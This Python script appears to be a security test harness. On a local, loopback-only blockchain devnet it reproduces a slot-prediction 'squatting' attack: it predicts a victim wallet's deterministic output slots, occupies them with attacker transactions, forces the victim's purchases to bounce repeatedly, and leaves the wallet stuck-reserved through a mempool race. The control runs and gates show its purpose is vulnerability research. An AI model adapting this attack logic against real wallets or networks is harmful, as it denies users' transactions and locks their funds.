#!/usr/bin/env python3
"""n1-squat: deterministic slot-hint prediction -> output-slot squatting.

Two gated stages against the shared early-finance devnet (V2@10/V2.1@24,
ports 21200-21219, loopback only):

  start    n1 (genesis+mining) + W1 worker + n3 (relay) + n2 (victim); wait V2.1
  fund     victim wallet (n2 daemon), seller + squatter (offline secrets)
  market   seller collection -> mint -> listings (the marketplace the victim
           buys from; all listing terms attacker-known)
  stage1   DETERMINISM GATE: repeated previews at a frozen tip -> identical
           plan_id; oracle cross-check of the slot walk; end-to-end control C0
           (predicted slots == the victim's actual submitted slots)
  stage2   live squat: purgatory loop ("native plan changed"), escape
           controls C1/C2, and the C28 composition (evicted pending tx leaves
           the wallet stuck-reserved until the next wallet op reconciles)

Every process gets a PID file; stopped only by PID. No pattern kills.
"""

import argparse
import json
import re
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from chaoslib import (  # noqa: E402
    ChaosError,
    CLI_BIN,
    LANE,
    MINING_KEY_N1,
    Node,
    OPERATOR_KEY_N1,
    RUN,
    probe,
    rpc,
    start_worker,
    stop_all,
    stop_worker,
    wait_until,
    worker_running,
)

TAG = "[n1]"

VICTIM_UTXOS = 4          # 1-NOID UTXOs at the victim (C0/C1/C2 consume three;
                          # the C28 round runs on the last one for zero spendable)
SQUATTER_UTXOS = 24       # 0.02-NOID UTXOs for the squat vehicle
ASK_MICRONOID = 500_000   # listing ask (0.5 NOID)
PURGATORY_ROUNDS = 3
LISTINGS = 8              # [0]=C0, [1..3]=purgatory, [4]=C1, [5]=C2, [6]=C28
                          # retry, [7]=C28

WORKER_NAME = "n1s-w1"
STATE_PATH = RUN / "state.json"


def load_state():
    if STATE_PATH.exists():
        return json.loads(STATE_PATH.read_text())
    return {}


def save_state(state):
    RUN.mkdir(parents=True, exist_ok=True)
    STATE_PATH.write_text(json.dumps(state, indent=2))


def make_n1():
    return Node(
        "n1s-n1",
        p2p_port=21200,
        rpc_port=21201,
        genesis=True,
        mining_key=MINING_KEY_N1,
        operator_key=OPERATOR_KEY_N1,
    )


def make_n2():
    return Node(
        "n1s-n2",
        p2p_port=21202,
        rpc_port=21203,
        seeds=["127.0.0.1:21204"],
    )


def make_n3():
    return Node(
        "n1s-n3",
        p2p_port=21204,
        rpc_port=21205,
        seeds=["127.0.0.1:21200"],
    )


def node_active(node):
    try:
        node.info(check=True)
        return True
    except Exception:  # noqa: BLE001
        return False


def wait_height(node, target, timeout=3600):
    wait_until(
        f"{node.name} reaches h{target}",
        lambda: node.height() >= target,
        timeout=timeout,
        interval=5,
    )


def cli(node, *args, timeout=240, check=True):
    cmd = [str(CLI_BIN), "--rpc", node.rpc_url, *[str(a) for a in args]]
    proc = subprocess.run(
        cmd, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout
    )
    out = (proc.stdout + proc.stderr).strip()
    if check and proc.returncode != 0:
        raise ChaosError(f"cli {args} failed: {out[:400]}")
    return out, proc.returncode


def send_amount(n1, addr, amount_noid, tries=3):
    for attempt in range(tries):
        out, code = cli(n1, "send", addr, str(amount_noid), timeout=300)
        if code == 0:
            return out
        time.sleep(6)
    raise ChaosError(f"send {amount_noid} to {addr} failed: {out[:400]}")


def wait_mined_tx(node, txid, timeout=600):
    wait_until(
        f"tx {txid[:16]} mined",
        lambda: rpc(node.rpc_url, "getTx", [txid], raw_error=True) or None,
        timeout=timeout,
        interval=4,
    )
    return rpc(node.rpc_url, "getTx", [txid])


def slots_by_owner(node, addr):
    slots = rpc(node.rpc_url, "getSlotsByOwner", [addr])
    return [
        (
            int(s["slot_index"]),
            int(s["value"]),
            int(s["creation_id"]),
        )
        for s in slots
    ]


def victim_address(n2):
    out, _ = cli(n2, "address")
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("o1"):
            return line.split()[0]
    raise ChaosError(f"no o1 address in cli output: {out[:300]}")


def victim_scan(n2):
    out, _ = cli(n2, "scan", timeout=300)
    return out


def victim_balance(n2):
    return rpc(n2.rpc_url, "walletGetBalance")


def request_json(kind, *args):
    out = probe("http://127.0.0.1:21201", "request-json", kind, *args)
    return json.loads(out.strip().splitlines()[-1])


def preview_native(n2, request, timeout=240):
    return rpc(n2.rpc_url, "walletPreviewNative", [request], timeout=timeout)


def submit_native(n2, request, plan_id, timeout=900):
    return rpc(
        n2.rpc_url,
        "walletSubmitNative",
        [request, plan_id],
        timeout=timeout,
        raw_error=True,
    )


def predict_slots(n1_url, request, owner, count=3, reserved=()):
    reserved_arg = ",".join(str(s) for s in reserved)
    out = probe(n1_url, "predict", json.dumps(request), owner, str(count), reserved_arg)
    line = out.strip().splitlines()[-1]
    match = re.search(
        r"tip=(\d+) state_root=([0-9a-f]+) seed=(\d+) slots=(\[.*\])", line
    )
    if not match:
        raise ChaosError(f"predict parse failed: {line[:300]}")
    return {
        "tip": int(match.group(1)),
        "state_root": match.group(2),
        "seed": int(match.group(3)),
        "slots": json.loads(match.group(4)),
    }


def parse_probe_kv(line):
    return dict(re.findall(r"(\w+)=([^ ]+)", line))


def do_squat(url, slot, expect_admit=True):
    out = probe(url, "squat", "squatter", str(slot))
    line = out.strip().splitlines()[-1]
    if "ADMITTED" in line:
        return {"admitted": True, "line": line}
    return {"admitted": False, "line": line}


def prep_squat(url, slot):
    out = probe(url, "squat-prep", "squatter", str(slot))
    line = out.strip().splitlines()[-1]
    if not line.startswith("PREP"):
        raise ChaosError(f"prep parse failed: {line[:300]}")
    return parse_probe_kv(line)


def fire_squat(url, hex_str):
    result = rpc(url, "submitTxIntent", [hex_str], timeout=60, raw_error=True)
    if "rpc_error" in result:
        return {"admitted": False, "error": str(result["rpc_error"])[:300]}
    return {"admitted": True, "txid": result}


# ---------------------------------------------------------------------------
# Phases
# ---------------------------------------------------------------------------


def phase_start(_args):
    n1, n2, n3 = make_n1(), make_n2(), make_n3()
    if not node_active(n1):
        n1.start()
    if not node_active(n3):
        n3.start()
    if not node_active(n2):
        n2.start()
    if not worker_running(WORKER_NAME):
        start_worker(WORKER_NAME, n1, threads=8, key=MINING_KEY_N1)
    wait_height(n1, 26)
    wait_until(
        "n2 tracks the chain via n3",
        lambda: n2.height() >= n1.height() - 2,
        timeout=600,
    )
    print(
        f"{TAG} start: n1 h={n1.height()} n3 h={n3.height()} n2 h={n2.height()}",
        flush=True,
    )


def phase_fund(_args):
    state = load_state()
    n1, n2 = make_n1(), make_n2()
    url = n1.rpc_url

    victim = state.get("victim")
    if not victim:
        victim = victim_address(n2)
        state["victim"] = victim
        save_state(state)

    def owner_utxo_count(addr):
        return len(slots_by_owner(n1, addr))

    # Victim: VICTIM_UTXOS x 1 NOID (daemon wallet of n2).
    have = owner_utxo_count(victim)
    for _ in range(VICTIM_UTXOS - have):
        send_amount(n1, victim, 1)
    wait_until(
        f"victim has {VICTIM_UTXOS} UTXOs",
        lambda: owner_utxo_count(victim) >= VICTIM_UTXOS,
        timeout=900,
        interval=4,
    )
    victim_scan(n2)
    bal = victim_balance(n2)
    print(f"{TAG} victim funded: {bal['utxo_count']} UTXOs, spendable={bal['spendable_micronoid']}", flush=True)

    # Seller: 2 x 20 NOID.
    seller = probe(url, "address", "seller").strip().splitlines()[-1]
    state["seller"] = seller
    have = owner_utxo_count(seller)
    for _ in range(2 - have):
        send_amount(n1, seller, 20)
    wait_until(
        "seller has 2 UTXOs",
        lambda: owner_utxo_count(seller) >= 2,
        timeout=600,
        interval=4,
    )

    # Squatter: SQUATTER_UTXOS x 0.02 NOID.
    squatter = probe(url, "address", "squatter").strip().splitlines()[-1]
    state["squatter"] = squatter
    have = owner_utxo_count(squatter)
    sent = 0
    while owner_utxo_count(squatter) < SQUATTER_UTXOS:
        out, code = cli(n1, "send", squatter, "0.02", timeout=300)
        sent += 1
        if code != 0:
            time.sleep(6)
        if sent % 8 == 0:
            time.sleep(1)
    wait_until(
        f"squatter has {SQUATTER_UTXOS} UTXOs",
        lambda: owner_utxo_count(squatter) >= SQUATTER_UTXOS,
        timeout=900,
        interval=4,
    )
    save_state(state)
    print(
        f"{TAG} funded: victim={victim} seller={seller[:16]}… "
        f"squatter={squatter[:16]}… ({SQUATTER_UTXOS} UTXOs)",
        flush=True,
    )
    floor = probe(url, "floor").strip().splitlines()[-1]
    print(f"{TAG} squat cost basis: {floor}", flush=True)


def phase_market(_args):
    state = load_state()
    n1 = make_n1()
    url = n1.rpc_url

    def run(label, *pargs):
        out = probe(url, *pargs)
        line = out.strip().splitlines()[-1]
        print(f"{TAG} {label}: {line}", flush=True)
        return line

    def wait_mined_pool():
        wait_until(
            "mempool drains",
            lambda: rpc(url, "getMempoolSize", []) == 0,
            timeout=600,
            interval=4,
        )

    if "collection_slot" not in state:
        line = run("collection", "collection")
        if "ADMITTED" not in line:
            raise ChaosError(f"collection failed: {line}")
        state["collection_slot"] = int(parse_probe_kv(line)["slot"])
        wait_mined_pool()
    run("confirm collection", "confirm")

    if "mint_slots" not in state:
        minted = []
        remaining = LISTINGS
        while remaining > 0:
            batch = min(3, remaining)
            line = run(f"mint {batch}", "mint", str(batch))
            if "ADMITTED" not in line:
                raise ChaosError(f"mint failed: {line}")
            minted.extend(
                json.loads(line.split("item_slots=")[1].strip().replace("'", '"'))
            )
            remaining -= batch
            wait_mined_pool()
            run("confirm mint", "confirm")
        state["mint_slots"] = minted
    run("confirm mint", "confirm")

    # Listings: one per item.
    def parse_listings():
        out = probe(url, "listings").strip().splitlines()
        recorded = []
        for line in out:
            match = re.match(
                r"(\d+): slot=(\d+) confirmed=(\w+) ask=(\d+) "
                r"collection=([0-9a-f]+) serial=(\d+)",
                line,
            )
            if match:
                recorded.append(
                    {
                        "index": int(match.group(1)),
                        "slot": int(match.group(2)),
                        "confirmed": match.group(3) == "yes",
                        "ask": int(match.group(4)),
                        "collection": match.group(5),
                        "serial": int(match.group(6)),
                    }
                )
        return recorded

    while True:
        recorded = parse_listings()
        if len(recorded) >= LISTINGS:
            break
        item_index = len(recorded)
        line = run(f"listing {item_index}", "list", str(item_index), str(ASK_MICRONOID))
        if "ADMITTED" not in line:
            raise ChaosError(f"listing {item_index} failed: {line}")
        wait_mined_pool()
        run("confirm listing", "confirm")

    run("final confirm", "confirm")
    recorded = parse_listings()
    if len(recorded) < LISTINGS:
        raise ChaosError(f"only {len(recorded)} listings recorded")
    unconfirmed = [r for r in recorded if not r["confirmed"]]
    if unconfirmed:
        raise ChaosError(f"listings not confirmed: {unconfirmed}")
    state["listings"] = recorded
    save_state(state)
    print(f"{TAG} market ready: {len(recorded)} listings, ask={ASK_MICRONOID}", flush=True)


def buy_request(listing):
    return request_json(
        "buy-nft", listing["collection"], str(listing["serial"]), str(listing["ask"])
    )


def freeze_tip(n1):
    stop_worker(WORKER_NAME)
    wait_until(
        "tip frozen (worker paused, stable for 3s)",
        lambda: _stable_height(n1),
        timeout=120,
        interval=1,
    )


def _stable_height(node):
    h1 = node.height()
    time.sleep(2)
    return node.height() == h1


def resume_mining(n1):
    if not worker_running(WORKER_NAME):
        start_worker(WORKER_NAME, n1, threads=8, key=MINING_KEY_N1)


def phase_stage1(_args):
    state = load_state()
    if "listings" not in state:
        raise ChaosError("run `market` first")
    n1, n2 = make_n1(), make_n2()
    url = n1.rpc_url
    results = {"gate": None}

    freeze_tip(n1)
    listing = state["listings"][0]
    request = buy_request(listing)

    # (a) Determinism: five previews at the same frozen tip.
    previews = []
    for i in range(5):
        p = preview_native(n2, request)
        previews.append(p)
        time.sleep(0.2)
    parents = {p["parent_hash"] for p in previews}
    roots = {p["state_root"] for p in previews}
    plan_ids = [p["plan_id"] for p in previews]
    echo_ok = all(p["request"] == request for p in previews)
    deterministic = len(set(plan_ids)) == 1 and len(parents) == 1
    print(
        f"{TAG} stage1a determinism: plan_ids={plan_ids[0][:16]}… x{len(set(plan_ids))} "
        f"distinct, single parent={len(parents) == 1}, echo_ok={echo_ok}",
        flush=True,
    )
    results["determinism"] = {
        "plan_ids": plan_ids,
        "single_plan": len(set(plan_ids)) == 1,
        "single_parent": len(parents) == 1,
        "echo_ok": echo_ok,
        "tip": previews[0]["height"] - 1,
        "state_root": previews[0]["state_root"],
    }
    if not deterministic:
        results["gate"] = "KILLED: plan_id differs across identical previews"
        save_results(results, "stage1")
        print(f"{TAG} {results['gate']}", flush=True)
        return

    # (b) Oracle: my reimplementation vs the node's own collector.
    oracle = []
    for salt in ("00", "dead", "beefcafe"):
        out = probe(url, "collect", salt, "8").strip().splitlines()[-1]
        oracle.append(out)
        print(f"{TAG} stage1b oracle salt={salt}: {out}", flush=True)
    oracle_ok = all("match=true" in line for line in oracle)
    results["oracle"] = {"lines": oracle, "ok": oracle_ok}

    # (c) Prediction + control C0: the victim's actual slots equal the
    # prediction; the squat at the predicted slot is rejected (SlotConflict).
    victim = state["victim"]
    pred = predict_slots(url, request, victim, count=3)
    print(
        f"{TAG} stage1c prediction: tip={pred['tip']} seed={pred['seed']} "
        f"slots={pred['slots']}",
        flush=True,
    )
    if pred["tip"] != previews[0]["height"] - 1:
        raise ChaosError(
            f"tip moved during prediction: {pred['tip']} vs {previews[0]['height'] - 1}"
        )
    results["prediction"] = pred

    submit = submit_native(n2, request, previews[0]["plan_id"])
    if "rpc_error" in submit:
        results["gate"] = f"KILLED: control submit failed: {submit['rpc_error']}"
        save_results(results, "stage1")
        print(f"{TAG} {results['gate']}", flush=True)
        return
    txid = submit["txid"]
    print(f"{TAG} stage1c C0: victim submit admitted txid={txid[:16]}…", flush=True)
    results["c0_txid"] = txid

    # The squat at the predicted slot must now be REJECTED (SlotConflict):
    # the victim's admitted tx occupies exactly the predicted slot.
    conflict = do_squat(n2.rpc_url, pred["slots"][0])
    print(f"{TAG} stage1c squat-at-predicted-slot: {conflict['line']}", flush=True)
    results["slot_conflict_probe"] = conflict

    # Mine and observe the actual output slots.
    resume_mining(n1)
    wait_mined_tx(n1, txid)
    time.sleep(3)
    victim_slots = slots_by_owner(n2, victim)
    seller_slots = slots_by_owner(n1, state["seller"])
    new_victim = [s for s in victim_slots if s[0] in pred["slots"]]
    new_seller = [s for s in seller_slots if s[0] in pred["slots"]]
    item_slot = rpc(n2.rpc_url, "getSlot", [pred["slots"][1]]) if len(pred["slots"]) > 1 else {}
    results["observed"] = {
        "predicted": pred["slots"],
        "victim_slots_in_prediction": new_victim,
        "seller_slots_in_prediction": new_seller,
        "item_slot_value": item_slot.get("value"),
        "item_slot_creation_id": item_slot.get("creation_id"),
        "item_slot_empty": item_slot.get("empty"),
    }
    change_match = any(s[0] == pred["slots"][2] for s in victim_slots) if len(pred["slots"]) > 2 else False
    pay_match = any(s[0] == pred["slots"][0] for s in seller_slots)
    item_match = (
        item_slot.get("empty") is False
        and item_slot.get("creation_id", 0) not in (None, 0)
        if len(pred["slots"]) > 1
        else False
    )
    print(
        f"{TAG} stage1c observed: change@S2={change_match} payment@S0={pay_match} "
        f"item@S1={item_match}",
        flush=True,
    )
    results["end_to_end"] = {
        "change_match": change_match,
        "payment_match": pay_match,
        "item_match": item_match,
    }

    gate = deterministic and oracle_ok and (change_match or pay_match)
    results["gate"] = "PASS" if gate else "FAIL"
    save_results(results, "stage1")
    print(f"{TAG} stage1 gate: {results['gate']}", flush=True)


def save_results(results, phase):
    path = RUN / f"{phase}.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(results, indent=2))
    state = load_state()
    state[phase] = results.get("gate")
    save_state(state)


def phase_stage2(_args):
    state = load_state()
    stage1 = json.loads((RUN / "stage1.json").read_text()) if (RUN / "stage1.json").exists() else {}
    if stage1.get("gate") != "PASS":
        raise ChaosError(f"stage1 gate is {stage1.get('gate')!r}; not running stage 2")
    n1, n2 = make_n1(), make_n2()
    url = n1.rpc_url
    victim = state["victim"]
    results = {"squats_fired": [], "purgatory": [], "reserved": []}

    # ------------------------------------------------------------------
    # 2a: purgatory loop. Miner paused; each round the attacker squats the
    # victim's freshly predicted slots, the victim's confirm bounces.
    # ------------------------------------------------------------------
    freeze_tip(n1)
    reserved = []
    listings = state["listings"]
    for round_index in range(1, PURGATORY_ROUNDS + 1):
        listing = listings[round_index]
        request = buy_request(listing)
        preview = preview_native(n2, request)
        pred = predict_slots(url, request, victim, count=3, reserved=reserved)
        print(
            f"{TAG} round {round_index}: predicted slots {pred['slots']} "
            f"(seed={pred['seed']})",
            flush=True,
        )
        fired = []
        for slot in pred["slots"]:
            squat = do_squat(n2.rpc_url, slot)
            fired.append(squat)
            reserved.append(slot)
        results["squats_fired"].extend(fired)
        submit = submit_native(n2, request, preview["plan_id"])
        bounced = (
            "rpc_error" in submit
            and "native plan changed" in str(submit.get("rpc_error", {}).get("message", ""))
        )
        print(
            f"{TAG} round {round_index}: victim confirm "
            f"{'BOUNCED (plan changed)' if bounced else 'admitted?!'} "
            f"{str(submit)[:160]}",
            flush=True,
        )
        results["purgatory"].append(
            {
                "round": round_index,
                "predicted_slots": pred["slots"],
                "squats": [f["line"] for f in fired],
                "bounced": bounced,
                "submit": str(submit)[:300],
            }
        )
    results["reserved"] = reserved

    # Control C1: attacker relents -> the same flow succeeds.
    listing_c1 = listings[PURGATORY_ROUNDS + 1]
    request_c1 = buy_request(listing_c1)
    preview_c1 = preview_native(n2, request_c1)
    submit_c1 = submit_native(n2, request_c1, preview_c1["plan_id"])
    c1_ok = "txid" in submit_c1
    print(f"{TAG} C1 escape (attacker relents): success={c1_ok}", flush=True)
    results["c1_escape"] = {"ok": c1_ok, "submit": str(submit_c1)[:200]}

    # Control C2: the victim varies one request field (maximum_ask +1);
    # the attacker's prediction (at the listing ask) now points at the wrong
    # slots and the submit succeeds despite active squats.
    listing_c2 = listings[PURGATORY_ROUNDS + 2]
    request_attacker = buy_request(listing_c2)  # predicted at the ask
    pred_c2 = predict_slots(url, request_attacker, victim, count=3, reserved=reserved)
    for slot in pred_c2["slots"]:
        do_squat(n2.rpc_url, slot)
        reserved.append(slot)
    request_victim = request_json(
        "buy-nft",
        listing_c2["collection"],
        str(listing_c2["serial"]),
        str(listing_c2["ask"] + 1),
    )
    preview_c2 = preview_native(n2, request_victim)
    submit_c2 = submit_native(n2, request_victim, preview_c2["plan_id"])
    c2_ok = "txid" in submit_c2
    print(
        f"{TAG} C2 randomized request escapes squat: success={c2_ok} "
        f"(attacker squatted {pred_c2['slots']})",
        flush=True,
    )
    results["c2_randomized"] = {
        "ok": c2_ok,
        "attacker_slots": pred_c2["slots"],
        "submit": str(submit_c2)[:200],
    }

    # ------------------------------------------------------------------
    # 2b: C28 composition. The victim's tx is admitted (wallet reserves),
    # then the attacker's prebuilt squat fires at the MINING node before the
    # victim's tx gossips there (victim is 2 hops away via n3). The block
    # mines the squat; the victim's pending tx is evicted with
    # OutputSlotOccupied and the wallet is stuck-reserved until the next
    # wallet operation reconciles. Race losses (victim tx gossips to the
    # mining node first) retry on the spare listing.
    # ------------------------------------------------------------------
    c28 = {"attempts": []}
    for attempt_index, listing_c28 in enumerate([listings[-1], listings[-2]]):
        request_c28 = buy_request(listing_c28)
        # Consolidate the victim to a single UTXO so the stuck state reads
        # as zero spendable. Drain first (C1/C2 changes return as UTXOs).
        resume_mining(n1)
        wait_until(
            "mempool drained before consolidation",
            lambda: rpc(n2.rpc_url, "getMempoolSize", []) == 0,
            timeout=600,
            interval=4,
        )
        bal = victim_balance(n2)
        full = bal["spendable_micronoid"]
        # Leave 0.05 NOID of headroom for the consolidation fee.
        full_noid = max(full - 50_000, 0) / 1_000_000
        out, code = cli(n2, "send", victim, f"{full_noid:.6f}", timeout=300, check=False)
        print(f"{TAG} C28 prep: victim self-send {full_noid:.6f} NOID (code={code})", flush=True)
        wait_until(
            "victim self-send mined (single UTXO)",
            lambda: victim_balance(n2)["utxo_count"] <= 1,
            timeout=600,
            interval=4,
        )
        freeze_tip(n1)
        victim_scan(n2)
        preview_c28 = preview_native(n2, request_c28)
        pred_c28 = predict_slots(url, request_c28, victim, count=3, reserved=reserved)
        prep = prep_squat(url, pred_c28["slots"][0])
        print(
            f"{TAG} C28 attempt {attempt_index}: prebuilt squat at "
            f"{pred_c28['slots'][0]} (input_slot={prep.get('input_slot')}, "
            f"fee={prep.get('fee')})",
            flush=True,
        )
        record = {
            "listing_index": listing_c28["index"],
            "predicted_slot": pred_c28["slots"][0],
            "prep": {k: prep.get(k) for k in ("input_slot", "fee", "slot")},
        }
        submit_c28 = submit_native(n2, request_c28, preview_c28["plan_id"])
        if "rpc_error" in submit_c28:
            record["submit_error"] = str(submit_c28)[:300]
            print(f"{TAG} C28: victim submit FAILED: {submit_c28}", flush=True)
            c28["attempts"].append(record)
            break
        record["victim_txid"] = submit_c28["txid"]
        print(f"{TAG} C28: victim submit admitted; firing prebuilt squat at n1", flush=True)
        fire = fire_squat(n1.rpc_url, prep["hex"])
        record["squat_at_n1_admitted"] = fire["admitted"]
        record["squat_at_n1_error"] = fire.get("error")
        print(f"{TAG} C28: squat at n1 admitted={fire['admitted']}", flush=True)
        c28["attempts"].append(record)
        if fire["admitted"]:
            resume_mining(n1)
            evicted = False
            try:
                wait_until(
                    "block with squat lands (victim tx evicted at n2)",
                    lambda: "output slot occupied by confirmed block"
                    in "\n".join(n2.managed.log_lines_since("===== START")),
                    timeout=600,
                    interval=3,
                )
                evicted = True
            except ChaosError as exc:
                print(f"{TAG} C28: eviction not observed: {exc}", flush=True)
            record["evicted"] = evicted
            if evicted:
                stuck = victim_balance(n2)
                c28["stuck_balance"] = stuck
                print(
                    f"{TAG} C28 stuck: pending_outbound={stuck['pending_outbound_micronoid']} "
                    f"spendable={stuck['spendable_micronoid']} "
                    f"utxos={stuck['utxo_count']}",
                    flush=True,
                )
                pending = rpc(n2.rpc_url, "walletNativePending", [], timeout=300)
                c28["pending_after_reconcile"] = [
                    {"txid": p["txid"][:16], "status": p["status"]} for p in pending
                ]
                healed = victim_balance(n2)
                c28["healed_balance"] = healed
                print(
                    f"{TAG} C28 after reconcile: pending_outbound="
                    f"{healed['pending_outbound_micronoid']} "
                    f"spendable={healed['spendable_micronoid']}",
                    flush=True,
                )
                break
        else:
            # Race lost: the victim's tx reached the mining node first. Mine
            # it out and retry on the spare listing.
            print(f"{TAG} C28: race lost, retrying on spare listing", flush=True)
            resume_mining(n1)
            wait_until(
                "race-lost victim tx mined",
                lambda: rpc(n2.rpc_url, "getMempoolSize", []) == 0,
                timeout=600,
                interval=4,
            )
    results["c28"] = c28
    results["gate"] = "DONE"
    save_results(results, "stage2")
    print(f"{TAG} stage2 complete; results in run/stage2.json", flush=True)


def phase_status(_args):
    n1, n2, n3 = make_n1(), make_n2(), make_n3()
    for node in (n1, n3, n2):
        if node_active(node):
            info = node.info()
            size = rpc(node.rpc_url, "getMempoolSize", [])
            print(f"{TAG} {node.name}: h={info['height']} mempool={size}", flush=True)
        else:
            print(f"{TAG} {node.name}: down", flush=True)
    state = load_state()
    print(f"{TAG} state: {json.dumps({k: v for k, v in state.items() if k != 'listings'})}", flush=True)


def phase_teardown(_args):
    n1, n2, n3 = make_n1(), make_n2(), make_n3()
    stop_worker(WORKER_NAME)
    stop_all([n2, n3, n1])


PHASES = {
    "start": phase_start,
    "fund": phase_fund,
    "market": phase_market,
    "stage1": phase_stage1,
    "stage2": phase_stage2,
    "status": phase_status,
    "teardown": phase_teardown,
}


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--phases", default="start,fund,market,stage1,stage2")
    args = parser.parse_args()
    for name in args.phases.split(","):
        name = name.strip()
        if name not in PHASES:
            raise SystemExit(f"unknown phase {name}")
        print(f"{TAG} === phase {name} ===", flush=True)
        try:
            PHASES[name](args)
        except ChaosError as exc:
            print(f"{TAG} phase {name} FAILED: {exc}", flush=True)
            raise
    print(f"{TAG} all requested phases done", flush=True)


if __name__ == "__main__":
    main()
